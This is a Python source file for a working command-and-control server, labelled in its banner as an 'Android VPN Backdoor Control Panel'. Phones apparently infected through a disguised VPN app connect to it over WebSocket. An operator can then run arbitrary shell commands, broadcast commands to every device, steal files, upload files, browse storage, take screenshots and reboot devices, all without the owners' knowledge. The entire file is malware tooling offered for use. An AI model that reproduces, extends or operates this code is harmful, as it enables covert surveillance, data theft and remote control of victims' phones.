#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import base64
import os
import sys
import time
import datetime
import threading
import signal
import readline
import termios
import tty
from typing import Dict, Optional

try:
    from websocket_server import WebsocketServer
except ImportError:
    print("Error: websocket-server library not installed.")
    print("Run: pip install websocket-server colorama")
    sys.exit(1)

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    
    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# Configuration
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8083

# Store connected devices
connected_devices = {}
device_info = {}
command_history = {}
download_state = {}  # For tracking download progress

# File browser state
file_browser_state = {
    'device_id': None,
    'current_path': '/sdcard',
    'files': [],
    'selected_index': 0,
    'waiting_for_response': False
}

# Colors
C = {
    'HEADER': Fore.CYAN + Style.BRIGHT,
    'BLUE': Fore.BLUE,
    'GREEN': Fore.GREEN,
    'YELLOW': Fore.YELLOW,
    'RED': Fore.RED,
    'MAGENTA': Fore.MAGENTA,
    'WHITE': Fore.WHITE,
    'RESET': Fore.RESET,
    'BOLD': Style.BRIGHT
}

def print_banner():
    banner = f"""
{C['HEADER']}╔══════════════════════════════════════════════════════════════╗
{C['HEADER']}║                                                              ║
{C['HEADER']}║  {C['MAGENTA']}██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ║
{C['HEADER']}║  {C['MAGENTA']}██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗ ║
{C['HEADER']}║  {C['MAGENTA']}██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║ ║
{C['HEADER']}║  {C['MAGENTA']}██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║ ║
{C['HEADER']}║  {C['MAGENTA']}██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝ ║
{C['HEADER']}║  {C['MAGENTA']}╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ║
{C['HEADER']}║                                                              ║
{C['HEADER']}║         {C['GREEN']}Android VPN Backdoor Control Panel{C['HEADER']}           ║
{C['HEADER']}║         {C['YELLOW']}Server: {SERVER_HOST}:{SERVER_PORT}{C['HEADER']}               ║
{C['HEADER']}╚══════════════════════════════════════════════════════════════╝
{C['RESET']}
"""
    print(banner)

def print_menu():
    menu = f"""
{C['GREEN']}╔══════════════════════════════════════════════════════════════╗
{C['GREEN']}║                    {C['WHITE']}COMMAND MENU{C['GREEN']}                         ║
{C['GREEN']}╠══════════════════════════════════════════════════════════════╣
{C['GREEN']}║  {C['YELLOW']}1.{C['RESET']} List connected devices                          {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}2.{C['RESET']} Send shell command to device                    {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}3.{C['RESET']} Download file from device                       {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}4.{C['RESET']} Upload file to device                           {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}5.{C['RESET']} List files on device                            {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}6.{C['RESET']} Take screenshot                                 {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}7.{C['RESET']} Get device info                                 {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}8.{C['RESET']} Ping device                                     {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}9.{C['RESET']} Reboot device                                   {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}10.{C['RESET']}View command history for device                {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}11.{C['RESET']}Broadcast command to ALL devices                {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}12.{C['RESET']}Interactive shell mode                          {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}13.{C['RESET']}File Browser with keyboard navigation          {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}0.{C['RESET']} Exit                                            {C['GREEN']}║
{C['GREEN']}╚══════════════════════════════════════════════════════════════╝
{C['RESET']}
"""
    print(menu)

def print_file_browser_help():
    help_text = f"""
{C['GREEN']}╔══════════════════════════════════════════════════════════════╗
{C['GREEN']}║              {C['WHITE']}FILE BROWSER CONTROLS{C['GREEN']}                    ║
{C['GREEN']}╠══════════════════════════════════════════════════════════════╣
{C['GREEN']}║  {C['YELLOW']}↑ / ↓{C['RESET']}       - Navigate up/down                      {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}Enter / →{C['RESET']}   - Open directory / select file          {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}← / Backspace{C['RESET']} - Go to parent directory              {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}d{C['RESET']}            - Download selected file                {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}s{C['RESET']}            - Download selected file (alternative)  {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}q / ESC{C['RESET']}      - Exit file browser                     {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}h / ?{C['RESET']}        - Show this help                        {C['GREEN']}║
{C['GREEN']}║  {C['YELLOW']}r{C['RESET']}            - Refresh current directory              {C['GREEN']}║
{C['GREEN']}╚══════════════════════════════════════════════════════════════╝
{C['RESET']}
"""
    print(help_text)

def get_devices_list():
    return list(connected_devices.keys())

def select_device(prompt="Select device ID"):
    devices = get_devices_list()
    
    if not devices:
        print(f"{C['RED']}❌ No devices connected!{C['RESET']}")
        return None
    
    print(f"\n{C['YELLOW']}Connected devices:{C['RESET']}")
    for i, device in enumerate(devices, 1):
        info = device_info.get(device, {})
        model = info.get('model', 'Unknown')
        print(f"  {C['GREEN']}{i}.{C['RESET']} {C['WHITE']}{device[:16]}...{C['RESET']} ({C['BLUE']}{model}{C['RESET']})")
    
    while True:
        try:
            choice = input(f"\n{C['YELLOW']}Enter device number (or 'q' to cancel): {C['RESET']}")
            if choice.lower() == 'q':
                return None
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                return devices[idx]
            else:
                print(f"{C['RED']}Invalid selection!{C['RESET']}")
        except ValueError:
            print(f"{C['RED']}Please enter a valid number!{C['RESET']}")

def send_command_to_device(client, device_id, command):
    if device_id not in connected_devices:
        print(f"{C['RED']}❌ Device {device_id} not connected!{C['RESET']}")
        return False
    
    try:
        client.send_message(connected_devices[device_id], json.dumps(command))
        
        if device_id not in command_history:
            command_history[device_id] = []
        command_history[device_id].append({
            'time': datetime.datetime.now().isoformat(),
            'command': command,
            'status': 'sent'
        })
        
        return True
    except Exception as e:
        print(f"{C['RED']}❌ Failed to send command: {e}{C['RESET']}")
        return False

def handle_device_info(device_id, data):
    device_info[device_id] = data
    model = data.get('model', 'Unknown')
    android_version = data.get('android_version', 'Unknown')
    print(f"\n{C['GREEN']}📱 Device connected:{C['RESET']}")
    print(f"  {C['WHITE']}ID:{C['RESET']} {device_id}")
    print(f"  {C['WHITE']}Model:{C['RESET']} {model}")
    print(f"  {C['WHITE']}Android:{C['RESET']} {android_version}")
    print(f"  {C['WHITE']}App Version:{C['RESET']} {data.get('app_version', 'Unknown')}")
    print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}")

def handle_command_response(device_id, data):
    global download_state
    
    cmd_type = data.get('type', 'unknown')
    
    if cmd_type == 'exec_result':
        output = data.get('output', '')
        error = data.get('error', '')
        exit_code = data.get('exit_code', -1)
        
        print(f"\n{C['MAGENTA']}═" * 50 + f"{C['RESET']}")
        print(f"{C['GREEN']}📤 Command Result from {device_id[:16]}...{C['RESET']}")
        print(f"{C['MAGENTA']}─" * 50 + f"{C['RESET']}")
        
        if output:
            print(f"{C['WHITE']}Output:{C['RESET']}")
            print(f"{C['GREEN']}{output}{C['RESET']}")
        
        if error:
            print(f"{C['RED']}Errors:{C['RESET']}")
            print(f"{C['RED']}{error}{C['RESET']}")
        
        print(f"{C['YELLOW']}Exit Code: {exit_code}{C['RESET']}")
        print(f"{C['MAGENTA']}═" * 50 + f"{C['RESET']}\n")
    
    # ==================== DOWNLOAD PROGRESS ====================
    
    elif cmd_type == 'download_start':
        file_path = data.get('path', 'unknown')
        file_size = data.get('size', 0)
        total_chunks = data.get('total_chunks', 0)
        
        download_state[device_id] = {
            'path': file_path,
            'size': file_size,
            'total_chunks': total_chunks,
            'received_chunks': 0,
            'chunks': [],
            'start_time': time.time()
        }
        
        print(f"\n{C['GREEN']}📥 Download started: {os.path.basename(file_path)}{C['RESET']}")
        print(f"  {C['WHITE']}Size:{C['RESET']} {file_size:,} bytes ({file_size / (1024*1024):.2f} MB)")
        print(f"  {C['WHITE']}Total Chunks:{C['RESET']} {total_chunks}")
        print(f"{C['YELLOW']}─" * 50 + f"{C['RESET']}")
        print(f"{C['YELLOW']}Progress: 0%{C['RESET']}", end='', flush=True)
    
    elif cmd_type == 'download_chunk':
        chunk_index = data.get('chunk_index', 0)
        chunk_data = data.get('data', '')
        
        if device_id in download_state:
            state = download_state[device_id]
            state['chunks'].append(chunk_data)
            state['received_chunks'] += 1
            
            total = state['total_chunks']
            received = state['received_chunks']
            progress = int((received * 100) / total)
            
            # Update progress every 5%
            if progress % 5 == 0 or received == total:
                elapsed = time.time() - state['start_time']
                speed = (state['size'] * progress / 100) / elapsed if elapsed > 0 else 0
                speed_mb = speed / (1024 * 1024)
                
                print(f"\r{C['YELLOW']}Progress: {progress}% ({received}/{total} chunks) - {speed_mb:.2f} MB/s{C['RESET']}", end='', flush=True)
    
    elif cmd_type == 'download_end':
        file_path = data.get('path', 'unknown')
        total_chunks = data.get('total_chunks', 0)
        file_size = data.get('size', 0)
        
        if device_id in download_state:
            state = download_state[device_id]
            
            # Combine all chunks
            print(f"\r{C['YELLOW']}Progress: 100% ({total_chunks}/{total_chunks} chunks){C['RESET']}")
            print(f"{C['YELLOW']}─" * 50 + f"{C['RESET']}")
            print(f"{C['GREEN']}📦 Assembling file...{C['RESET']}")
            
            all_data = b''
            for chunk_b64 in state['chunks']:
                all_data += base64.b64decode(chunk_b64)
            
            # Save file
            filename = os.path.basename(file_path)
            if not filename:
                filename = f"downloaded_{int(time.time())}.bin"
            
            save_path = os.path.join('downloads', filename)
            os.makedirs('downloads', exist_ok=True)
            
            with open(save_path, 'wb') as f:
                f.write(all_data)
            
            elapsed = time.time() - state['start_time']
            speed = file_size / elapsed if elapsed > 0 else 0
            
            print(f"{C['GREEN']}✅ Download complete!{C['RESET']}")
            print(f"  {C['WHITE']}File:{C['RESET']} {save_path}")
            print(f"  {C['WHITE']}Size:{C['RESET']} {file_size:,} bytes ({file_size / (1024*1024):.2f} MB)")
            print(f"  {C['WHITE']}Time:{C['RESET']} {elapsed:.2f} seconds")
            print(f"  {C['WHITE']}Speed:{C['RESET']} {speed / (1024*1024):.2f} MB/s")
            
            # Clean up
            del download_state[device_id]
            print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
    
    elif cmd_type == 'file_download':
        # Old format - keep for compatibility
        file_path = data.get('path', 'unknown')
        file_size = data.get('size', 0)
        file_content = data.get('base64', '')
        
        print(f"\n{C['GREEN']}📥 File downloaded from {device_id[:16]}...{C['RESET']}")
        print(f"  {C['WHITE']}Path:{C['RESET']} {file_path}")
        print(f"  {C['WHITE']}Size:{C['RESET']} {file_size} bytes")
        
        if file_content:
            try:
                filename = os.path.basename(file_path)
                if not filename:
                    filename = f"downloaded_{int(time.time())}.bin"
                
                file_data = base64.b64decode(file_content)
                save_path = os.path.join('downloads', filename)
                
                os.makedirs('downloads', exist_ok=True)
                
                with open(save_path, 'wb') as f:
                    f.write(file_data)
                
                print(f"  {C['GREEN']}Saved to:{C['RESET']} {save_path}")
            except Exception as e:
                print(f"  {C['RED']}Error saving file: {e}{C['RESET']}")
        
        print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
    
    elif cmd_type == 'file_list':
        directory = data.get('directory', '/sdcard')
        files = data.get('files', [])
        
        file_browser_state['files'] = files
        file_browser_state['current_path'] = directory
        file_browser_state['waiting_for_response'] = False
        
        if file_browser_state['device_id']:
            display_file_browser()
        else:
            print(f"\n{C['GREEN']}📂 File list from {device_id[:16]}...{C['RESET']}")
            print(f"  {C['WHITE']}Directory:{C['RESET']} {directory}")
            print(f"{C['MAGENTA']}─" * 50 + f"{C['RESET']}")
            
            if files:
                for file_info in files:
                    name = file_info.get('name', '')
                    size = file_info.get('size', 0)
                    is_dir = file_info.get('is_directory', False)
                    
                    icon = "📁" if is_dir else "📄"
                    size_str = f"{size:,} bytes" if size > 0 else "-"
                    
                    print(f"  {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']})")
            else:
                print(f"  {C['YELLOW']}No files found or empty directory{C['RESET']}")
            
            print(f"{C['GREEN']}─" * 50 + f"{C['RESET']}\n")
    
    elif cmd_type == 'response':
        status = data.get('status', 'unknown')
        message = data.get('message', '')
        
        if status == 'success':
            print(f"{C['GREEN']}✅ Success: {message}{C['RESET']}")
        elif status == 'pong':
            print(f"{C['GREEN']}🏓 Pong received from {device_id[:16]}...{C['RESET']}")
        else:
            print(f"{C['RED']}❌ {status}: {message}{C['RESET']}")
    
    elif cmd_type == 'device_info':
        handle_device_info(device_id, data)
    
    else:
        print(f"{C['YELLOW']}📩 Received: {json.dumps(data, indent=2)}{C['RESET']}")

def display_file_browser():
    files = file_browser_state['files']
    current_path = file_browser_state['current_path']
    selected = file_browser_state['selected_index']
    device_id = file_browser_state['device_id']
    
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"{C['HEADER']}═" * 80 + f"{C['RESET']}")
    print(f"{C['GREEN']}📱 File Browser - {device_id[:16]}...{C['RESET']}")
    print(f"{C['YELLOW']}📂 {current_path}{C['RESET']}")
    print(f"{C['HEADER']}─" * 80 + f"{C['RESET']}")
    
    if not files:
        print(f"{C['RED']}  (No files or empty directory){C['RESET']}")
    else:
        for i, file_info in enumerate(files):
            name = file_info.get('name', '')
            size = file_info.get('size', 0)
            is_dir = file_info.get('is_directory', False)
            
            icon = "📁" if is_dir else "📄"
            size_str = f"{size:,} bytes" if size > 0 else "-"
            
            if i == selected:
                print(f"{C['GREEN']}▶ {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']}) {C['GREEN']}◀{C['RESET']}")
            else:
                print(f"  {icon} {C['WHITE']}{name}{C['RESET']} ({C['BLUE']}{size_str}{C['RESET']})")
    
    print(f"{C['HEADER']}─" * 80 + f"{C['RESET']}")
    print(f"{C['YELLOW']}↑/↓ Navigate | Enter/→ Open | ←/Backspace Parent | d Download | q Exit{C['RESET']}")

def get_key():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

def cmd_file_browser(server):
    device_id = select_device()
    if not device_id:
        return
    
    file_browser_state['device_id'] = device_id
    file_browser_state['current_path'] = '/sdcard'
    file_browser_state['selected_index'] = 0
    file_browser_state['files'] = []
    file_browser_state['waiting_for_response'] = False
    
    print_file_browser_help()
    input(f"\n{C['YELLOW']}Press Enter to start file browser...{C['RESET']}")
    
    cmd_data = {"cmd": "list_files", "directory": "/sdcard"}
    send_command_to_device(server, device_id, cmd_data)
    file_browser_state['waiting_for_response'] = True
    time.sleep(2)
    
    while True:
        try:
            if not file_browser_state['waiting_for_response']:
                display_file_browser()
            
            key = get_key()
            
            if key == '\x1b':
                next_key = sys.stdin.read(1)
                if next_key == '[':
                    arrow = sys.stdin.read(1)
                    if arrow == 'A':
                        if file_browser_state['selected_index'] > 0:
                            file_browser_state['selected_index'] -= 1
                        continue
                    elif arrow == 'B':
                        files = file_browser_state['files']
                        if file_browser_state['selected_index'] < len(files) - 1:
                            file_browser_state['selected_index'] += 1
                        continue
                    elif arrow == 'C':
                        pass
                    elif arrow == 'D':
                        pass
            
            if key == 'q' or key == 'Q' or key == '\x1b':
                print(f"\n{C['YELLOW']}🔚 Exiting file browser{C['RESET']}")
                file_browser_state['device_id'] = None
                break
            
            elif key == 'h' or key == '?':
                print_file_browser_help()
                input(f"\n{C['YELLOW']}Press Enter to continue...{C['RESET']}")
                continue
            
            elif key == 'r' or key == 'R':
                cmd_data = {"cmd": "list_files", "directory": file_browser_state['current_path']}
                send_command_to_device(server, device_id, cmd_data)
                file_browser_state['waiting_for_response'] = True
                time.sleep(1)
                continue
            
            elif key == '\x7f' or key == '\x08' or key == '\x1b[D':
                current = file_browser_state['current_path']
                if current == '/sdcard':
                    parent = '/storage/emulated/0'
                else:
                    parent = os.path.dirname(current)
                    if parent == current:
                        parent = '/sdcard'
                    elif parent == '':
                        parent = '/sdcard'
                
                file_browser_state['current_path'] = parent
                file_browser_state['selected_index'] = 0
                cmd_data = {"cmd": "list_files", "directory": parent}
                send_command_to_device(server, device_id, cmd_data)
                file_browser_state['waiting_for_response'] = True
                time.sleep(1)
                continue
            
            elif key == '\r' or key == '\n' or key == '\x1b[C':
                files = file_browser_state['files']
                idx = file_browser_state['selected_index']
                
                if idx < len(files):
                    file_info = files[idx]
                    name = file_info.get('name', '')
                    is_dir = file_info.get('is_directory', False)
                    
                    if is_dir:
                        new_path = file_browser_state['current_path']
                        if not new_path.endswith('/'):
                            new_path += '/'
                        new_path += name
                        
                        file_browser_state['current_path'] = new_path
                        file_browser_state['selected_index'] = 0
                        cmd_data = {"cmd": "list_files", "directory": new_path}
                        send_command_to_device(server, device_id, cmd_data)
                        file_browser_state['waiting_for_response'] = True
                        time.sleep(1)
                    else:
                        file_path = file_browser_state['current_path']
                        if not file_path.endswith('/'):
                            file_path += '/'
                        file_path += name
                        
                        print(f"\n{C['GREEN']}📥 Downloading: {name}{C['RESET']}")
                        cmd_data = {"cmd": "download", "path": file_path}
                        send_command_to_device(server, device_id, cmd_data)
                        time.sleep(1)
                continue
            
            elif key == 'd' or key == 'D' or key == 's' or key == 'S':
                files = file_browser_state['files']
                idx = file_browser_state['selected_index']
                
                if idx < len(files):
                    file_info = files[idx]
                    name = file_info.get('name', '')
                    is_dir = file_info.get('is_directory', False)
                    
                    if is_dir:
                        print(f"{C['YELLOW']}⚠️ Cannot download directory: {name}{C['RESET']}")
                    else:
                        file_path = file_browser_state['current_path']
                        if not file_path.endswith('/'):
                            file_path += '/'
                        file_path += name
                        
                        print(f"\n{C['GREEN']}📥 Downloading: {name}{C['RESET']}")
                        cmd_data = {"cmd": "download", "path": file_path}
                        send_command_to_device(server, device_id, cmd_data)
                        time.sleep(1)
                else:
                    print(f"{C['RED']}❌ No file selected!{C['RESET']}")
                continue
            
            else:
                continue
            
        except KeyboardInterrupt:
            print(f"\n{C['YELLOW']}🔚 Exiting file browser{C['RESET']}")
            file_browser_state['device_id'] = None
            break
        except Exception as e:
            print(f"{C['RED']}❌ Error: {e}{C['RESET']}")
            time.sleep(1)

# ================= WEBSOCKET SERVER CALLBACKS =================

def new_client(client, server):
    device_id = client.get('headers', {}).get('x-device-id', 'unknown')
    
    if device_id == 'unknown':
        device_id = f"device_{client['id']}"
    
    connected_devices[device_id] = client
    print(f"{C['GREEN']}✅ Device connected: {device_id[:16]}...{C['RESET']}")

def client_left(client, server):
    for device_id, ws_client in list(connected_devices.items()):
        if ws_client['id'] == client['id']:
            connected_devices.pop(device_id, None)
            print(f"{C['RED']}❌ Device disconnected: {device_id[:16]}...{C['RESET']}")
            break

def message_received(client, server, message):
    device_id = None
    for did, ws_client in connected_devices.items():
        if ws_client['id'] == client['id']:
            device_id = did
            break
    
    if not device_id:
        device_id = f"unknown_{client['id']}"
    
    try:
        data = json.loads(message)
        handle_command_response(device_id, data)
    except json.JSONDecodeError:
        print(f"{C['YELLOW']}📩 Received binary from {device_id[:16]}... (size: {len(message)} bytes){C['RESET']}")

# ================= COMMAND FUNCTIONS =================

def cmd_list_devices():
    devices = get_devices_list()
    
    if not devices:
        print(f"\n{C['YELLOW']}⚠️ No devices connected!{C['RESET']}\n")
        return
    
    print(f"\n{C['GREEN']}═" * 60 + f"{C['RESET']}")
    print(f"{C['WHITE']}{'Connected Devices':^60}{C['RESET']}")
    print(f"{C['GREEN']}═" * 60 + f"{C['RESET']}")
    
    for i, device_id in enumerate(devices, 1):
        info = device_info.get(device_id, {})
        model = info.get('model', 'Unknown')
        android = info.get('android_version', '?')
        
        print(f"\n{C['YELLOW']}{i}.{C['RESET']}")
        print(f"  {C['WHITE']}Device ID:{C['RESET']} {device_id}")
        print(f"  {C['WHITE']}Model:{C['RESET']} {model}")
        print(f"  {C['WHITE']}Android:{C['RESET']} {android}")
        print(f"  {C['WHITE']}Status:{C['RESET']} {C['GREEN']}● Online{C['RESET']}")
    
    print(f"\n{C['GREEN']}═" * 60 + f"{C['RESET']}\n")

def cmd_execute_command(server):
    device_id = select_device()
    if not device_id:
        return
    
    command = input(f"\n{C['YELLOW']}Enter shell command to execute: {C['RESET']}")
    if not command:
        print(f"{C['RED']}❌ Command cannot be empty!{C['RESET']}")
        return
    
    cmd_data = {"cmd": "exec", "command": command}
    send_command_to_device(server, device_id, cmd_data)

def cmd_download_file(server):
    device_id = select_device()
    if not device_id:
        return
    
    file_path = input(f"\n{C['YELLOW']}Enter file path on device: {C['RESET']}")
    if not file_path:
        print(f"{C['RED']}❌ File path cannot be empty!{C['RESET']}")
        return
    
    cmd_data = {"cmd": "download", "path": file_path}
    send_command_to_device(server, device_id, cmd_data)

def cmd_upload_file(server):
    device_id = select_device()
    if not device_id:
        return
    
    local_path = input(f"\n{C['YELLOW']}Enter local file path to upload: {C['RESET']}")
    if not local_path or not os.path.exists(local_path):
        print(f"{C['RED']}❌ File not found!{C['RESET']}")
        return
    
    remote_path = input(f"{C['YELLOW']}Enter remote path on device: {C['RESET']}")
    if not remote_path:
        remote_path = os.path.basename(local_path)
    
    try:
        with open(local_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')
        
        cmd_data = {"cmd": "upload", "path": remote_path, "data": file_data}
        send_command_to_device(server, device_id, cmd_data)
    except Exception as e:
        print(f"{C['RED']}❌ Failed to read file: {e}{C['RESET']}")

def cmd_list_files(server):
    device_id = select_device()
    if not device_id:
        return
    
    directory = input(f"\n{C['YELLOW']}Enter directory path (default: /sdcard): {C['RESET']}")
    if not directory:
        directory = "/sdcard"
    
    cmd_data = {"cmd": "list_files", "directory": directory}
    send_command_to_device(server, device_id, cmd_data)

def cmd_take_screenshot(server):
    device_id = select_device()
    if not device_id:
        return
    
    cmd_data = {"cmd": "screenshot"}
    send_command_to_device(server, device_id, cmd_data)

def cmd_get_info(server):
    device_id = select_device()
    if not device_id:
        return
    
    cmd_data = {"cmd": "get_info"}
    send_command_to_device(server, device_id, cmd_data)

def cmd_ping(server):
    device_id = select_device()
    if not device_id:
        return
    
    cmd_data = {"cmd": "ping"}
    send_command_to_device(server, device_id, cmd_data)

def cmd_reboot(server):
    device_id = select_device()
    if not device_id:
        return
    
    confirm = input(f"\n{C['RED']}⚠️ Are you sure you want to reboot the device? (y/n): {C['RESET']}")
    if confirm.lower() != 'y':
        print(f"{C['YELLOW']}❌ Reboot cancelled{C['RESET']}")
        return
    
    cmd_data = {"cmd": "reboot"}
    send_command_to_device(server, device_id, cmd_data)

def cmd_view_history():
    device_id = select_device()
    if not device_id:
        return
    
    history = command_history.get(device_id, [])
    
    if not history:
        print(f"\n{C['YELLOW']}⚠️ No command history for this device{C['RESET']}\n")
        return
    
    print(f"\n{C['MAGENTA']}═" * 60 + f"{C['RESET']}")
    print(f"{C['WHITE']}{'Command History':^60}{C['RESET']}")
    print(f"{C['MAGENTA']}═" * 60 + f"{C['RESET']}")
    
    for i, entry in enumerate(history[-20:], 1):
        time_str = entry.get('time', '')
        cmd = entry.get('command', {})
        status = entry.get('status', '')
        
        print(f"\n{C['YELLOW']}{i}.{C['RESET']} {C['BLUE']}{time_str}{C['RESET']}")
        print(f"   {C['WHITE']}Command:{C['RESET']} {json.dumps(cmd)}")
        print(f"   {C['WHITE']}Status:{C['RESET']} {C['GREEN']}{status}{C['RESET']}")
    
    print(f"\n{C['MAGENTA']}═" * 60 + f"{C['RESET']}\n")

def cmd_broadcast(server):
    devices = get_devices_list()
    if not devices:
        print(f"\n{C['RED']}❌ No devices connected!{C['RESET']}\n")
        return
    
    command = input(f"\n{C['YELLOW']}Enter command to broadcast: {C['RESET']}")
    if not command:
        print(f"{C['RED']}❌ Command cannot be empty!{C['RESET']}")
        return
    
    cmd_data = {"cmd": "exec", "command": command}
    
    print(f"\n{C['GREEN']}📢 Broadcasting to {len(devices)} devices...{C['RESET']}")
    for device_id in devices:
        send_command_to_device(server, device_id, cmd_data)
    
    print(f"{C['GREEN']}✅ Broadcast complete!{C['RESET']}\n")

def cmd_interactive_shell(server):
    device_id = select_device()
    if not device_id:
        return
    
    print(f"\n{C['GREEN']}═" * 60 + f"{C['RESET']}")
    print(f"{C['GREEN']}📱 Interactive Shell Mode for {device_id[:16]}...{C['RESET']}")
    print(f"{C['YELLOW']}Type 'exit' to quit, 'help' for commands{C['RESET']}")
    print(f"{C['GREEN']}═" * 60 + f"{C['RESET']}\n")
    
    while True:
        try:
            cmd = input(f"{C['GREEN']}shell>{C['RESET']} ")
            
            if not cmd:
                continue
            
            if cmd.lower() == 'exit':
                print(f"{C['YELLOW']}🔚 Exiting interactive mode{C['RESET']}")
                break
            
            if cmd.lower() == 'help':
                print(f"\n{C['WHITE']}Available commands:{C['RESET']}")
                print(f"  {C['YELLOW']}exit{C['RESET']} - Exit interactive mode")
                print(f"  {C['YELLOW']}help{C['RESET']} - Show this help")
                print(f"  {C['YELLOW']}clear{C['RESET']} - Clear screen")
                print(f"  {C['YELLOW']}download <path>{C['RESET']} - Download file")
                print(f"  {C['YELLOW']}ls <path>{C['RESET']} - List files")
                print(f"  {C['YELLOW']}screenshot{C['RESET']} - Take screenshot")
                print(f"  {C['YELLOW']}info{C['RESET']} - Get device info")
                print(f"\n{C['WHITE']}Other commands will be executed as shell commands{C['RESET']}\n")
                continue
            
            if cmd.lower() == 'clear':
                os.system('clear' if os.name == 'posix' else 'cls')
                continue
            
            parts = cmd.split(' ', 1)
            special = parts[0].lower()
            
            if special == 'download' and len(parts) > 1:
                send_command_to_device(server, device_id, {"cmd": "download", "path": parts[1]})
            elif special == 'ls' and len(parts) > 1:
                send_command_to_device(server, device_id, {"cmd": "list_files", "directory": parts[1]})
            elif special == 'ls':
                send_command_to_device(server, device_id, {"cmd": "list_files", "directory": "/sdcard"})
            elif special == 'screenshot':
                send_command_to_device(server, device_id, {"cmd": "screenshot"})
            elif special == 'info':
                send_command_to_device(server, device_id, {"cmd": "get_info"})
            else:
                send_command_to_device(server, device_id, {"cmd": "exec", "command": cmd})
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print(f"\n{C['YELLOW']}🔚 Exiting interactive mode{C['RESET']}")
            break
        except Exception as e:
            print(f"{C['RED']}❌ Error: {e}{C['RESET']}")

def signal_handler(sig, frame):
    print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
    sys.exit(0)

# ================= MAIN =================

def main():
    signal.signal(signal.SIGINT, signal_handler)
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()
    
    os.makedirs('downloads', exist_ok=True)
    
    print(f"{C['GREEN']}🚀 Starting WebSocket server on {SERVER_HOST}:{SERVER_PORT}{C['RESET']}")
    print(f"{C['YELLOW']}📡 Waiting for Android devices to connect...{C['RESET']}\n")
    
    server = WebsocketServer(host=SERVER_HOST, port=SERVER_PORT)
    server.set_fn_new_client(new_client)
    server.set_fn_client_left(client_left)
    server.set_fn_message_received(message_received)
    
    import threading
    server_thread = threading.Thread(target=server.run_forever, daemon=True)
    server_thread.start()
    
    print(f"{C['GREEN']}✅ Server started successfully!{C['RESET']}")
    print(f"{C['WHITE']}Press Ctrl+C to stop the server{C['RESET']}\n")
    
    while True:
        try:
            print_menu()
            choice = input(f"\n{C['YELLOW']}Enter your choice: {C['RESET']}")
            
            if choice == '0':
                print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
                break
            
            elif choice == '1':
                cmd_list_devices()
            
            elif choice == '2':
                cmd_execute_command(server)
            
            elif choice == '3':
                cmd_download_file(server)
            
            elif choice == '4':
                cmd_upload_file(server)
            
            elif choice == '5':
                cmd_list_files(server)
            
            elif choice == '6':
                cmd_take_screenshot(server)
            
            elif choice == '7':
                cmd_get_info(server)
            
            elif choice == '8':
                cmd_ping(server)
            
            elif choice == '9':
                cmd_reboot(server)
            
            elif choice == '10':
                cmd_view_history()
            
            elif choice == '11':
                cmd_broadcast(server)
            
            elif choice == '12':
                cmd_interactive_shell(server)
            
            elif choice == '13':
                cmd_file_browser(server)
            
            else:
                print(f"{C['RED']}❌ Invalid choice! Please try again.{C['RESET']}")
            
            if choice != '13':
                input(f"\n{C['YELLOW']}Press Enter to continue...{C['RESET']}")
                os.system('clear' if os.name == 'posix' else 'cls')
                print_banner()
            
        except KeyboardInterrupt:
            print(f"\n{C['YELLOW']}🔚 Shutting down server...{C['RESET']}")
            break
        except Exception as e:
            print(f"{C['RED']}❌ Error: {e}{C['RESET']}")
    
    server.shutdown()
    print(f"{C['GREEN']}✅ Server stopped successfully!{C['RESET']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C['YELLOW']}🔚 Exiting...{C['RESET']}")
    except Exception as e:
        print(f"{C['RED']}❌ Fatal error: {e}{C['RESET']}")
